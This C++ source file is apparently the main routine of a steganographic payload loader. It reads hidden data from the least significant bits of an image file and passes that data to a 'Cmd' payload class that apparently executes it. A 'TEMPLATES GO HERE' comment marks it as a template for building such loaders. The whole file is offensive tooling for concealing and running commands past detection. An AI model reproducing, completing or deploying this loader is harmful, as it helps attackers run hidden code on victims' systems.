#include "reader.h"

int _tmain(int argc, TCHAR** argv) {

    if (argc == 3) {      
        // Init Gdiplus
        GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

        // Do the job
        int payload_bits = _ttoi(argv[1]);

        // TEMPLATES GO HERE
        auto img = ImageSources::FileSystem(argv[2]);
        img.loadImage();

        auto alg = Algorithms::LSB();
        alg.readImage(img.bm, payload_bits);

        auto pld = Payloads::Cmd();
        pld.Run(alg.payload_data, payload_bits);

        // Shutdown Gdiplus
        GdiplusShutdown(gdiplusToken);
    }

    return 0;
}